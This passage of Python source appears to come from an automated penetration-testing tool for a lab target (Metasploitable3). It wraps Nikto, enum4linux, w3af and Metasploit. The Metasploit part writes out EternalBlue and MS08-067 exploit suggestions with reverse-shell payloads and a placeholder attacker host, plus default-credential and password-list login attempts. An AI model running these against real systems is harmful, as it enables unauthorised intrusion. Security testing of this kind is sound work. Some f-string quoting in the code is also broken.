        if any(keyword in title_lower for keyword in ['buffer overflow', 'remote code execution', 'rce', 'privilege escalation',
                                                        'arbitrary code', 'command execution', 'shell', 'backdoor', 'authentication bypass']):
            return 'critical'

        # High severity
        if any(keyword in title_lower for keyword in ['sql injection', 'xss', 'cross-site', 'file inclusion', 'lfi', 'rfi',
                                                        'denial of service', 'dos', 'crash']):
            return 'high'

        # Medium severity
        if any(keyword in title_lower for keyword in ['weak password', 'disclosure', 'bypass', 'enumeration', 'information']):
            return 'medium'

        # Default to low
        return 'low'

    def _extract_service_mappings(self, output: str, results: Dict[str, Any]) -> None:
        """Extract service-to-exploit mappings from output."""
        try:
            service_exploits = {}

            for line in output.split('\n'):
                line = line.strip().lower()

                for pattern in [r'(\w+)\s+([\d\.]+)', r'(\w+/[\d\.]+)', r'port\s+(\d+)/(\w+)']:
                    matches = re.findall(pattern, line)
                    for match in matches:
                        service = match[0] if isinstance(match, tuple) else match
                        if service not in service_exploits:
                            service_exploits[service] = 0
                        service_exploits[service] += 1

            results['summary']['by_service'] = service_exploits

        except Exception as e:
            logger.debug(f"Error extracting service mappings: {e}")

class NiktoWrapper:
    """Nikto wrapper for web vulnerability scanning."""

    def __init__(self, results_dir: Optional[Path] = None):
        self.results_dir = results_dir or config.get_results_dir()
        self.timeout = config.get('tools.nikto.timeout', 600)
        self.scan_results = []

    def check_availability(self) -> bool:
        """Check if nikto is available on the system."""
        try:
            executable = config.get('tools.nikto.executable')
            result = subprocess.run([executable, '--help'],
                                    capture_output=True,
                                    timeout=10,
                                    text=True)
            available = result.returncode == 0
            logger.log_tool_availability('nikto', available, executable if available else None)
            return available
        except Exception as e:
            logger.log_tool_availability('nikto', False)
            logger.debug(f"Nikto availability check failed: {e}")
            return False

    def scan_http_services(self, http_ports: List[Dict[str, Any]]) -> Tuple[bool, str]:
        """Scan multiple HTTP/HTTPS services with Nikto."""
        if not http_ports:
            logger.info("No HTTP/HTTPS ports found for Nikto scanning")
            return True, "No HTTP/HTTPS services to scan"

        logger.start_tool_step('nikto', f'Scanning {len(http_ports)} HTTP/HTTPS services')

        self.scan_results = []
        successful_scans = 0
        failed_scans = 0

        self.results_dir.mkdir(parents=True, exist_ok=True)

        for http_service in http_ports:
            url = http_service['url']
            port = http_service['port']
            ip = http_service['ip']

            success, message = self._scan_single_service(url, ip, port)

            if success:
                successful_scans += 1
            else:
                failed_scans += 1
                logger.error(f"Nikto scan failed for {url}: {message}")

        self._create_summary_file()

        overall_success = successful_scans > 0
        summary_message = f"Nikto completed: {successful_scans} successful, {failed_scans} failed"

        logger.end_tool_step('nikto', overall_success, summary_message)
        return overall_success, summary_message

    def _scan_single_service(self, url: str, ip: str, port: int) -> Tuple[bool, str]:
        """Scan a single HTTP/HTTPS service with Nikto."""
        try:
            xml_output_file = self.results_dir / f"nikto_{ip}_{port}.xml"

            executable = config.get('tools.nikto.executable')
            command = [
                executable,
                '-h', url,
                '-Format', 'xml',
                '-output', str(xml_output_file),
                '-Tuning', 'x',  # Skip time-intensive checks
                '-maxtime', '10m'  # Max 10 minutes per host
            ]

            logger.debug(f"Scanning {url} with Nikto (quick mode)")
            logger.log_command_execution(command, str(self.results_dir))

            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                cwd=str(self.results_dir)
            )

            stdout, stderr = process.communicate(timeout=self.timeout)

            if stdout.strip():
                logger.log_tool_output('nikto', stdout, False)
            if stderr.strip() and 'error' in stderr.lower():
                logger.log_tool_output('nikto', stderr, True)

            if xml_output_file.exists():
                scan_result = self._parse_nikto_xml(xml_output_file, url, ip, port)
                if scan_result:
                    self.scan_results.append(scan_result)
                    logger.debug(f"Nikto scan completed for {url}")
                    return True, f"Scan completed, XML saved to {xml_output_file}"
                else:
                    return False, "Failed to parse Nikto XML output"
            else:
                error_msg = f"Nikto XML output not created (exit code: {process.returncode})"
                if stderr:
                    error_msg += f"\nError: {stderr}"
                return False, error_msg

        except subprocess.TimeoutExpired:
            return False, f"Nikto scan timed out after {self.timeout} seconds"
        except Exception as e:
            return False, f"Nikto execution error: {str(e)}"

    def _parse_nikto_xml(self, xml_file: Path, url: str, ip: str, port: int) -> Optional[Dict[str, Any]]:
        """Parse Nikto XML output file."""
        try:
            logger.debug(f"Parsing Nikto XML: {xml_file}")

            with open(xml_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

            content = self._clean_nikto_xml(content)

            root = ET.fromstring(content)

            scan_result = {
                'url': url,
                'ip': ip,
                'port': port,
                'scan_details': {},
                'vulnerabilities': [],
                'statistics': {}
            }

            scandetails = root.find('.//scandetails')
            if scandetails is not None:
                scan_result['scan_details'] = {
                    'targetip': scandetails.get('targetip', ip),
                    'targethostname': scandetails.get('targethostname', ''),
                    'targetport': scandetails.get('targetport', str(port)),
                    'targetbanner': scandetails.get('targetbanner', ''),
                    'starttime': scandetails.get('starttime', ''),
                    'sitename': scandetails.get('sitename', url)
                }

            for item in root.findall('.//item'):
                vulnerability = {
                    'id': item.get('id', ''),
                    'osvdbid': item.get('osvdbid', ''),
                    'method': item.get('method', ''),
                    'uri': item.get('uri', ''),
                    'description': item.text.strip() if item.text else '',
                    'namelink': item.get('namelink', ''),
                    'iplink': item.get('iplink', '')
                }

                vulnerability['severity'] = self._determine_severity(vulnerability['description'])

                scan_result['vulnerabilities'].append(vulnerability)

            statistics = root.find('.//statistics')
            if statistics is not None:
                scan_result['statistics'] = {
                    'elapsed': statistics.get('elapsed', ''),
                    'itemsfound': statistics.get('itemsfound', '0'),
                    'itemstested': statistics.get('itemstested', '0')
                }

            logger.log_xml_parsing(str(xml_file), True,
                                   f"Found {len(scan_result['vulnerabilities'])} vulnerabilities")

            return scan_result

        except Exception as e:
            logger.log_xml_parsing(str(xml_file), False, str(e))
            return None

    def _clean_nikto_xml(self, xml_content: str) -> str:
        """Clean up malformed XML content from Nikto."""
        try:
            xml_content = re.sub(r'[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]', '', xml_content)
            xml_content = re.sub(r'&(?!(?:amp|lt|gt|quot|apos);)', '&amp;', xml_content)

            if not xml_content.strip().endswith('</niktoscan>'):
                xml_content += '</niktoscan>'

            return xml_content

        except Exception as e:
            logger.debug(f"Error cleaning XML content: {e}")
            return xml_content

    def _determine_severity(self, description: str) -> str:
        """Determine vulnerability severity based on description keywords."""
        if not description:
            return 'info'

        desc_lower = description.lower()

        high_keywords = [
            'remote code execution', 'rce', 'sql injection', 'command injection',
            'buffer overflow', 'privilege escalation', 'arbitrary file', 'directory traversal'
        ]

        medium_keywords = [
            'cross-site scripting', 'xss', 'csrf', 'authentication bypass',
            'information disclosure', 'weak authentication', 'default credentials'
        ]

        low_keywords = [
            'information leak', 'banner', 'version disclosure', 'robots.txt',
            'debug', 'test file', 'backup file'
        ]

        if any(keyword in desc_lower for keyword in high_keywords):
            return 'high'
        elif any(keyword in desc_lower for keyword in medium_keywords):
            return 'medium'
        elif any(keyword in desc_lower for keyword in low_keywords):
            return 'low'
        else:
            return 'info'

    def _create_summary_file(self) -> None:
        """Create a summary file of all Nikto scan results."""
        try:
            summary_file = self.results_dir / "nikto_summary.txt"

            with open(summary_file, 'w', encoding='utf-8') as f:
                f.write("NIKTO SCAN SUMMARY\n")
                f.write("=" * 50 + "\n\n")

                if not self.scan_results:
                    f.write("No Nikto scan results available.\n")
                    return

                total_vulns = sum(len(result['vulnerabilities']) for result in self.scan_results)
                f.write(f"Total services scanned: {len(self.scan_results)}\n")
                f.write(f"Total vulnerabilities found: {total_vulns}\n\n")

                for result in self.scan_results:
                    f.write(f"Service: {result['url']}\n")
                    f.write(f"IP: {result['ip']}:{result['port']}\n")
                    f.write(f"Vulnerabilities found: {len(result['vulnerabilities'])}\n")

                    if result['vulnerabilities']:
                        severity_counts = {'high': 0, 'medium': 0, 'low': 0, 'info': 0}
                        for vuln in result['vulnerabilities']:
                            severity = vuln.get('severity', 'info')
                            severity_counts[severity] += 1

                        f.write(f"  - High: {severity_counts['high']}\n")
                        f.write(f"  - Medium: {severity_counts['medium']}\n")
                        f.write(f"  - Low: {severity_counts['low']}\n")
                        f.write(f"  - Info: {severity_counts['info']}\n")

                    f.write("\n" + "-" * 40 + "\n\n")

                all_vulns = []
                for result in self.scan_results:
                    for vuln in result['vulnerabilities']:
                        vuln['service_url'] = result['url']
                        all_vulns.append(vuln)

                severity_order = {'high': 3, 'medium': 2, 'low': 1, 'info': 0}
                all_vulns.sort(key=lambda v: severity_order.get(v.get('severity', 'info'), 0), reverse=True)

                f.write("TOP VULNERABILITIES (by severity):\n")
                f.write("-" * 40 + "\n")

                for i, vuln in enumerate(all_vulns[:20]):
                    f.write(f"{i+1}. [{vuln.get('severity', 'info').upper()}] {vuln['service_url']}\n")
                    f.write(f"   URI: {vuln.get('uri', 'N/A')}\n")
                    f.write(f"   Description: {vuln.get('description', 'N/A')[:100]}...\n")
                    f.write("\n")

            logger.debug(f"Nikto summary saved to {summary_file}")

        except Exception as e:
            logger.error(f"Error creating Nikto summary file: {e}")

    def get_scan_summary(self) -> Dict[str, Any]:
        """Get a summary of scan results for reporting."""
        if not self.scan_results:
            return {
                'services_scanned': 0,
                'total_vulnerabilities': 0,
                'severity_breakdown': {'high': 0, 'medium': 0, 'low': 0, 'info': 0},
                'top_vulnerabilities': []
            }

        total_vulns = sum(len(result['vulnerabilities']) for result in self.scan_results)
        severity_counts = {'high': 0, 'medium': 0, 'low': 0, 'info': 0}

        all_vulns = []
        for result in self.scan_results:
            for vuln in result['vulnerabilities']:
                severity = vuln.get('severity', 'info')
                severity_counts[severity] += 1
                all_vulns.append({
                    'url': result['url'],
                    'description': vuln.get('description', '')[:80] + '...',
                    'severity': severity,
                    'uri': vuln.get('uri', '')
                })

        severity_order = {'high': 3, 'medium': 2, 'low': 1, 'info': 0}
        all_vulns.sort(key=lambda v: severity_order.get(v['severity'], 0), reverse=True)

        return {
            'services_scanned': len(self.scan_results),
            'total_vulnerabilities': total_vulns,
            'severity_breakdown': severity_counts,
            'top_vulnerabilities': all_vulns[:10]
        }

class MetasploitWrapper:
    """Metasploit Framework integration wrapper."""

    def __init__(self, results_dir: Optional[Path] = None):
        self.results_dir = results_dir or config.get_results_dir()
        self.output_file = self.results_dir / f"metasploit_suggestions_{getattr(self, "target_ip", "unknown")}.txt"
        self.timeout = config.get('tools.msfconsole.timeout', 300)

    def check_availability(self) -> bool:
        """Check if msfconsole is available on the system."""
        try:
            executable = config.get('tools.msfconsole.executable')
            result = subprocess.run([executable, '--version'],
                                    capture_output=True,
                                    timeout=10,
                                    text=True)
            output = result.stdout + result.stderr
            available = 'Framework' in output or 'Metasploit' in output or 'metasploit' in output
            logger.log_tool_availability('msfconsole', available, executable if available else None)
            return available
        except Exception as e:
            logger.log_tool_availability('msfconsole', False)
            logger.debug(f"msfconsole availability check failed: {e}")
            return False

    def generate_exploit_suggestions(self, nmap_results: Dict[str, Any],
                                   searchsploit_results: Dict[str, Any],
                                   enum4linux_results: Dict[str, Any]) -> Tuple[bool, str]:
        """Generate Metasploit exploit suggestions based on scan results."""
        try:
            logger.start_tool_step('metasploit', 'Generating exploit suggestions')

            suggestions = []
            target_ip = None

            # Extract target IP from nmap results
            if nmap_results and 'hosts' in nmap_results:
                for host in nmap_results['hosts']:
                    for addr in host.get('addresses', []):
                        if addr.get('addrtype') == 'ipv4':
                            target_ip = addr['addr']
                            break
                    if target_ip:
                        break

            if not target_ip:
                return False, "No target IP found for Metasploit suggestions"

            # Analyze services for known vulnerabilities
            if nmap_results and 'hosts' in nmap_results:
                for host in nmap_results['hosts']:
                    for port in host.get('ports', []):
                        if port.get('state', {}).get('state') == 'open':
                            port_num = int(port.get('portid', 0))
                            service_name = port.get('service', {}).get('name', '').lower()
                            product = port.get('service', {}).get('product', '').lower()
                            version = port.get('service', {}).get('version', '')

                            # SMB vulnerabilities (Metasploitable3)
                            if port_num == 445 and 'smb' in service_name:
                                suggestions.extend(self._get_smb_exploits(target_ip, product, version))

                            # MySQL vulnerabilities
                            if port_num == 3306 and 'mysql' in service_name:
                                suggestions.extend(self._get_mysql_exploits(target_ip, version))

                            # HTTP/HTTPS services
                            if port_num in [80, 443, 8080, 8443] and 'http' in service_name:
                                suggestions.extend(self._get_web_exploits(target_ip, port_num, product))

                            # RDP vulnerabilities
                            if port_num == 3389 and 'rdp' in service_name:
                                suggestions.extend(self._get_rdp_exploits(target_ip, version))

            # Add enum4linux-based suggestions
            if enum4linux_results:
                suggestions.extend(self._get_enum4linux_suggestions(target_ip, enum4linux_results))

            # Write suggestions to file
            self._write_suggestions_file(suggestions, target_ip)

            logger.end_tool_step('metasploit', True, f"Generated {len(suggestions)} exploit suggestions")
            return True, f"Generated {len(suggestions)} Metasploit exploit suggestions"

        except Exception as e:
            error_msg = f"Metasploit suggestion generation error: {str(e)}"
            logger.end_tool_step('metasploit', False, error_msg)
            return False, error_msg

    def _get_smb_exploits(self, target_ip: str, product: str, version: str) -> List[Dict[str, Any]]:
        """Get SMB-related exploit suggestions."""
        suggestions = []

        # EternalBlue (MS17-010) - common on Metasploitable3
        if 'windows' in product.lower() or not product:
            suggestions.append({
                'module': 'exploit/windows/smb/ms17_010_eternalblue',
                'name': 'EternalBlue SMB Remote Code Execution',
                'description': 'MS17-010 EternalBlue SMBv1 exploit',
                'options': {
                    'RHOSTS': target_ip,
                    'LHOST': 'YOUR_IP_HERE',
                    'LPORT': '4444'
                },
                'payload': 'windows/x64/meterpreter/reverse_tcp',
                'priority': 'high'
            })

        # Other SMB exploits
        suggestions.extend([
            {
                'module': 'auxiliary/scanner/smb/smb_ms17_010',
                'name': 'SMB MS17-010 Scanner',
                'description': 'Check if target is vulnerable to MS17-010',
                'options': {'RHOSTS': target_ip},
                'priority': 'medium'
            },
            {
                'module': 'exploit/windows/smb/ms08_067_netapi',
                'name': 'MS08-067 NetAPI',
                'description': 'MS08-067 SMB NetAPI exploit',
                'options': {
                    'RHOSTS': target_ip,
                    'LHOST': 'YOUR_IP_HERE'
                },
                'payload': 'windows/meterpreter/reverse_tcp',
                'priority': 'high'
            }
        ])

        return suggestions

    def _get_mysql_exploits(self, target_ip: str, version: str) -> List[Dict[str, Any]]:
        """Get MySQL-related exploit suggestions."""
        suggestions = []

        suggestions.append({
            'module': 'auxiliary/scanner/mysql/mysql_login',
            'name': 'MySQL Login Scanner',
            'description': 'Attempt to login to MySQL with default credentials',
            'options': {
                'RHOSTS': target_ip,
                'USERNAME': 'root',
                'PASSWORD': ''
            },
            'priority': 'high'
        })

        return suggestions

    def _get_web_exploits(self, target_ip: str, port: int, product: str) -> List[Dict[str, Any]]:
        """Get web service exploit suggestions."""
        suggestions = []

        protocol = 'https' if port in [443, 8443] else 'http'
        target_url = f"{protocol}://{target_ip}:{port}"

        # Common web exploits for Metasploitable3
        suggestions.extend([
            {
                'module': 'auxiliary/scanner/http/http_login',
                'name': 'HTTP Login Scanner',
                'description': 'Test for common web login interfaces',
                'options': {
                    'RHOSTS': target_ip,
                    'RPORT': str(port),
                    'TARGETURI': '/'
                },
                'priority': 'medium'
            },
            {
                'module': 'auxiliary/scanner/http/dir_scanner',
                'name': 'Directory Scanner',
                'description': 'Scan for common web directories',
                'options': {
                    'RHOSTS': target_ip,
                    'RPORT': str(port)
                },
                'priority': 'low'
            }
        ])

        return suggestions

    def _get_rdp_exploits(self, target_ip: str, version: str) -> List[Dict[str, Any]]:
        """Get RDP-related exploit suggestions."""
        suggestions = []

        suggestions.append({
            'module': 'auxiliary/scanner/rdp/rdp_scanner',
            'name': 'RDP Scanner',
            'description': 'Check RDP service configuration',
            'options': {'RHOSTS': target_ip},
            'priority': 'low'
        })

        return suggestions

    def _get_enum4linux_suggestions(self, target_ip: str, enum4linux_results: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate suggestions based on enum4linux results."""
        suggestions = []

        # Check for interesting users
        interesting_users = ['administrator', 'admin', 'guest', 'service', 'sql']
        found_users = [user.get('username', '').lower() for user in enum4linux_results.get('users', [])]

        for user in found_users:
            if any(int_user in user for int_user in interesting_users):
                suggestions.append({
                    'module': 'auxiliary/scanner/smb/smb_login',
                    'name': f'SMB Login Check for {user}',
                    'description': f'Attempt SMB login with common passwords for user {user}',
                    'options': {
                        'RHOSTS': target_ip,
                        'SMBUser': user,
                        'SMBPass': 'password,vagrant,admin,123456'
                    },
                    'priority': 'high'
                })
                break  # Only add one login check

        return suggestions

    def _write_suggestions_file(self, suggestions: List[Dict[str, Any]], target_ip: str) -> None:
        """Write exploit suggestions to file."""
        try:
            self.results_dir.mkdir(parents=True, exist_ok=True)

            with open(self.output_file, 'w', encoding='utf-8') as f:
                f.write("METASPLOIT EXPLOIT SUGGESTIONS\n")
                f.write("=" * 50 + "\n\n")
                f.write(f"Target IP: {target_ip}\n")
                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")

                if not suggestions:
                    f.write("No specific exploit suggestions generated.\n")
                    f.write("Try manual enumeration or use generic Metasploit modules.\n")
                    return

                # Group by priority
                high_priority = [s for s in suggestions if s.get('priority') == 'high']
                medium_priority = [s for s in suggestions if s.get('priority') == 'medium']
                low_priority = [s for s in suggestions if s.get('priority') == 'low']

                for priority, exploits in [("HIGH", high_priority), ("MEDIUM", medium_priority), ("LOW", low_priority)]:
                    if exploits:
                        f.write(f"{priority} PRIORITY EXPLOITS:\n")
                        f.write("-" * 30 + "\n")

                        for i, exploit in enumerate(exploits, 1):
                            f.write(f"{i}. {exploit['name']}\n")
                            f.write(f"   Module: {exploit['module']}\n")
                            f.write(f"   Description: {exploit['description']}\n")

                            if 'options' in exploit:
                                f.write("   Options:\n")
                                for key, value in exploit['options'].items():
                                    f.write(f"     {key} = {value}\n")

                            if 'payload' in exploit:
                                f.write(f"   Payload: {exploit['payload']}\n")

                            f.write("\n")

                        f.write("\n")

                # Add usage instructions
                f.write("USAGE INSTRUCTIONS:\n")
                f.write("-" * 20 + "\n")
                f.write("1. Start Metasploit: msfconsole\n")
                f.write("2. Use a module: use <module_path>\n")
                f.write("3. Set options: set <OPTION> <VALUE>\n")
                f.write("4. Set payload (if applicable): set PAYLOAD <payload>\n")
                f.write("5. Run exploit: exploit\n\n")

                f.write("EXAMPLE:\n")
                f.write("msf6 > use exploit/windows/smb/ms17_010_eternalblue\n")
                f.write("msf6 > set RHOSTS 192.168.1.100\n")
                f.write("msf6 > set LHOST YOUR_IP_HERE\n")
                f.write("msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp\n")
                f.write("msf6 > exploit\n")

        except Exception as e:
            logger.error(f"Error writing Metasploit suggestions: {e}")

# =============================================================================
# CORE ORCHESTRATION
# =============================================================================

class Enum4LinuxWrapper:
    """enum4linux wrapper for SMB enumeration."""

    def __init__(self, results_dir: Optional[Path] = None):
        self.results_dir = results_dir or config.get_results_dir()
        self.output_file = self.results_dir / f"enum4linux_{getattr(self, "target_ip", "unknown")}.txt"
        self.timeout = config.get('tools.enum4linux.timeout', 300)
        self.raw_output = ""

    def check_availability(self) -> bool:
        """Check if enum4linux is available on the system."""
        try:
            executable = config.get('tools.enum4linux.executable')
            result = subprocess.run([executable, '-h'],
                                    capture_output=True,
                                    timeout=10,
                                    text=True)
            output = (result.stdout + result.stderr).lower()
            available = 'enum4linux' in output or 'usage' in output
            logger.log_tool_availability('enum4linux', available, executable if available else None)
            return available
        except Exception as e:
            logger.log_tool_availability('enum4linux', False)
            logger.debug(f"enum4linux availability check failed: {e}")
            return False

    def run_enumeration(self, target_ip: str) -> Tuple[bool, str]:
        """Run enum4linux enumeration against target."""
        try:
            logger.start_tool_step('enum4linux', f'Enumerating SMB services on {target_ip}')

            executable = config.get('tools.enum4linux.executable')
            command = [executable, '-a', target_ip]

            self.results_dir.mkdir(parents=True, exist_ok=True)

            logger.log_command_execution(command, str(self.results_dir))

            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                cwd=str(self.results_dir)
            )

            stdout, stderr = process.communicate(timeout=self.timeout)

            self.raw_output = stdout

            with open(self.output_file, 'w', encoding='utf-8') as f:
                f.write("ENUM4LINUX ENUMERATION RESULTS\n")
                f.write("=" * 50 + "\n\n")
                f.write(f"Target: {target_ip}\n")
                f.write(f"Command: {' '.join(command)}\n\n")
                f.write("STDOUT OUTPUT:\n")
                f.write(stdout)
                if stderr.strip():
                    f.write("\n\nSTDERR OUTPUT:\n")
                    f.write(stderr)

            if stdout.strip():
                logger.log_tool_output('enum4linux', stdout, False)
            if stderr.strip():
                logger.log_tool_output('enum4linux', stderr, True)

            success = len(stdout.strip()) > 100

            if success:
                logger.end_tool_step('enum4linux', True, f"Results saved to {self.output_file}")
                return True, f"enum4linux enumeration completed. Results: {self.output_file}"
            else:
                error_msg = f"enum4linux produced minimal output (exit code: {process.returncode})"
                if stderr:
                    error_msg += f"\nError: {stderr}"
                logger.end_tool_step('enum4linux', False, error_msg)
                return False, error_msg

        except subprocess.TimeoutExpired:
            error_msg = f"enum4linux timed out after {self.timeout} seconds"
            logger.end_tool_step('enum4linux', False, error_msg)
            return False, error_msg
        except Exception as e:
            error_msg = f"enum4linux execution error: {str(e)}"
            logger.end_tool_step('enum4linux', False, error_msg)
            return False, error_msg

    def parse_results(self, output: Optional[str] = None) -> Dict[str, Any]:
        """Parse enum4linux output and extract key information."""
        if output is None:
            output = self.raw_output
            if not output and self.output_file.exists():
                try:
                    with open(self.output_file, 'r', encoding='utf-8') as f:
                        content = f.read()
                        if "STDOUT OUTPUT:" in content:
                            output = content.split("STDOUT OUTPUT:")[1]
                            if "STDERR OUTPUT:" in output:
                                output = output.split("STDERR OUTPUT:")[0]
                except Exception as e:
                    logger.error(f"Error reading enum4linux output: {e}")
                    return {'users': [], 'groups': [], 'shares': [], 'os_info': {}, 'summary': {}}

        results = {
            'users': [],
            'groups': [],
            'shares': [],
            'os_info': {},
            'domain_info': {},
            'password_policy': {},
            'summary': {}
        }

        if not output:
            return results

        try:
            lines = output.split('\n')

            self._parse_os_information(lines, results)
            self._parse_domain_information(lines, results)
            self._parse_users(lines, results)
            self._parse_groups(lines, results)
            self._parse_shares(lines, results)
            self._parse_password_policy(lines, results)

            results['summary'] = {
                'users_found': len(results['users']),
                'groups_found': len(results['groups']),
                'shares_found': len(results['shares']),
                'has_os_info': bool(results['os_info']),
                'has_domain_info': bool(results['domain_info'])
            }

            logger.debug(f"Parsed enum4linux results: {results['summary']}")
            return results

        except Exception as e:
            logger.error(f"Error parsing enum4linux results: {e}")
            return results

    def _parse_os_information(self, lines: List[str], results: Dict[str, Any]) -> None:
        """Parse OS information from enum4linux output."""
        try:
            in_os_section = False

            for line in lines:
                line = line.strip()

                if 'OS information on' in line or 'Target Information' in line:
                    in_os_section = True
                    continue
                elif line.startswith('=====') and in_os_section:
                    in_os_section = False
                    continue

                if in_os_section or 'OS:' in line:
                    if re.search(r'OS:\s*(.+)', line):
                        match = re.search(r'OS:\s*(.+)', line)
                        results['os_info']['name'] = match.group(1).strip()
                    elif 'Computer:' in line:
                        results['os_info']['computer'] = line.split('Computer:')[1].strip()
                    elif 'NetBIOS computer name:' in line:
                        results['os_info']['netbios_name'] = line.split('NetBIOS computer name:')[1].strip()
                    elif 'Workgroup\\Domain name:' in line:
                        results['os_info']['domain'] = line.split('Workgroup\\Domain name:')[1].strip()

        except Exception as e:
            logger.debug(f"Error parsing OS information: {e}")

    def _parse_domain_information(self, lines: List[str], results: Dict[str, Any]) -> None:
        """Parse domain information from enum4linux output."""
        try:
            for line in lines:
                line = line.strip()

                if 'Domain Name:' in line:
                    results['domain_info']['name'] = line.split('Domain Name:')[1].strip()
                elif 'Domain Sid:' in line:
                    results['domain_info']['sid'] = line.split('Domain Sid:')[1].strip()
                elif 'Local SID for the domain:' in line:
                    results['domain_info']['local_sid'] = line.split('Local SID for the domain:')[1].strip()

        except Exception as e:
            logger.debug(f"Error parsing domain information: {e}")

    def _parse_users(self, lines: List[str], results: Dict[str, Any]) -> None:
        """Parse user information from enum4linux output."""
        try:
            in_user_section = False

            for line in lines:
                line = line.strip()

                if ('Getting the list of users:' in line or
                    'Users on' in line or
                    'user:[' in line):
                    in_user_section = True

                if in_user_section:
                    user_patterns = [
                        r'user:\[([^\]]+)\].*rid:\[([^\]]+)\]',
                        r'S-[\d\-]+\s+([^\s]+)\s+\(.*User.*\)',
                        r'(\w+)\s+.*\(User\)',
                    ]

                    for pattern in user_patterns:
                        match = re.search(pattern, line, re.IGNORECASE)
                        if match:
                            username = match.group(1)
                            user_info = {'username': username}

                            if len(match.groups()) > 1:
                                user_info['rid'] = match.group(2)

                            if not any(u['username'] == username for u in results['users']):
                                results['users'].append(user_info)
                            break

        except Exception as e:
            logger.debug(f"Error parsing users: {e}")

    def _parse_groups(self, lines: List[str], results: Dict[str, Any]) -> None:
        """Parse group information from enum4linux output."""
        try:
            for line in lines:
                line = line.strip()

                group_patterns = [
                    r'group:\[([^\]]+)\].*rid:\[([^\]]+)\]',
                    r'(\w+)\s+.*\(Group\)',
                ]

                for pattern in group_patterns:
                    match = re.search(pattern, line, re.IGNORECASE)
                    if match:
                        groupname = match.group(1)
                        group_info = {'groupname': groupname}

                        if len(match.groups()) > 1:
                            group_info['rid'] = match.group(2)

                        if not any(g['groupname'] == groupname for g in results['groups']):
                            results['groups'].append(group_info)
                        break

        except Exception as e:
            logger.debug(f"Error parsing groups: {e}")

    def _parse_shares(self, lines: List[str], results: Dict[str, Any]) -> None:
        """Parse share information from enum4linux output."""
        try:
            in_share_section = False

            for line in lines:
                line = line.strip()

                if ('Share Enumeration on' in line or
                    'Sharename' in line and 'Type' in line):
                    in_share_section = True
                    continue

                if in_share_section:
                    share_match = re.match(r'(\w+)\s+(Disk|IPC|Printer)\s*(.*)', line)
                    if share_match:
                        share_info = {
                            'name': share_match.group(1),
                            'type': share_match.group(2),
                            'comment': share_match.group(3).strip() if share_match.group(3) else ''
                        }
                        results['shares'].append(share_info)

                    elif line.startswith('=====') or 'Attempting to map shares' in line:
                        in_share_section = False

        except Exception as e:
            logger.debug(f"Error parsing shares: {e}")

    def _parse_password_policy(self, lines: List[str], results: Dict[str, Any]) -> None:
        """Parse password policy information from enum4linux output."""
        try:
            for line in lines:
                line = line.strip()

                if 'Password Complexity Flags:' in line:
                    results['password_policy']['complexity'] = line.split(':')[1].strip()
                elif 'Minimum password length:' in line:
                    results['password_policy']['min_length'] = line.split(':')[1].strip()
                elif 'Password history length:' in line:
                    results['password_policy']['history_length'] = line.split(':')[1].strip()
                elif 'Maximum password age:' in line:
                    results['password_policy']['max_age'] = line.split(':')[1].strip()

        except Exception as e:
            logger.debug(f"Error parsing password policy: {e}")

    def get_enumeration_summary(self) -> Dict[str, Any]:
        """Get a summary of enumeration results for reporting."""
        results = self.parse_results()

        summary = {
            'users_found': len(results['users']),
            'groups_found': len(results['groups']),
            'shares_found': len(results['shares']),
            'interesting_users': [],
            'interesting_shares': [],
            'os_details': results.get('os_info', {}),
            'domain_details': results.get('domain_info', {})
        }

        admin_keywords = ['admin', 'administrator', 'root', 'service', 'sql']
        for user in results['users']:
            username = user['username'].lower()
            if any(keyword in username for keyword in admin_keywords):
                summary['interesting_users'].append(user['username'])

        standard_shares = ['ipc$', 'c$', 'admin$', 'print$']
        for share in results['shares']:
            share_name = share['name'].lower()
            if share_name not in standard_shares and share['type'] == 'Disk':
                summary['interesting_shares'].append(share['name'])

        return summary

class W3afWrapper:
    """w3af wrapper for web application scanning."""

    def __init__(self, results_dir: Optional[Path] = None):
        self.results_dir = results_dir or config.get_results_dir()
        self.script_file = self.results_dir / "w3af_script.w3af"
        self.output_file = self.results_dir / "w3af_report.txt"
        self.timeout = config.get('tools.w3af_console.timeout', 600)
        self.script_timeout = config.get('tools.w3af_console.script_timeout', 300)

    def check_availability(self) -> bool:
        """Check if w3af_console is available on the system."""
        try:
            executable = config.get('tools.w3af_console.executable')
            result = subprocess.run([executable, '--help'],
                                    capture_output=True,
                                    timeout=10,
                                    text=True)
            available = result.returncode == 0
            logger.log_tool_availability('w3af_console', available, executable if available else None)
            return available
        except Exception as e:
            logger.log_tool_availability('w3af_console', False)
            logger.debug(f"w3af availability check failed: {e}")
            return False

    def run_scan(self, http_ports: List[Dict[str, Any]]) -> Tuple[bool, str]:
        """Run w3af scan against discovered HTTP services."""
        if not http_ports:
            logger.info("No HTTP/HTTPS ports found for w3af scanning")
            return True, "No HTTP/HTTPS services to scan"

        logger.start_tool_step('w3af', f'Scanning {len(http_ports)} HTTP/HTTPS services')

        self.results_dir.mkdir(parents=True, exist_ok=True)

        # Create w3af script
        script_content = self._create_w3af_script(http_ports)

        with open(self.script_file, 'w', encoding='utf-8') as f:
            f.write(script_content)

        # Run w3af
        executable = config.get('tools.w3af_console.executable')
        command = [executable, '-s', str(self.script_file)]

        logger.log_command_execution(command, str(self.results_dir))

        try:
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                cwd=str(self.results_dir)
            )

            stdout, stderr = process.communicate(timeout=self.timeout)

            with open(self.output_file, 'w', encoding='utf-8') as f:
                f.write("W3AF SCAN RESULTS\n")
                f.write("=" * 50 + "\n\n")
                f.write(f"Script: {self.script_file}\n")
                f.write(f"Command: {' '.join(command)}\n\n")
                f.write("STDOUT OUTPUT:\n")
                f.write(stdout)
                if stderr.strip():
                    f.write("\n\nSTDERR OUTPUT:\n")
                    f.write(stderr)

            if stdout.strip():
                logger.log_tool_output('w3af', stdout, False)
            if stderr.strip():
                logger.log_tool_output('w3af', stderr, True)

            success = process.returncode == 0 and len(stdout.strip()) > 100

            if success:
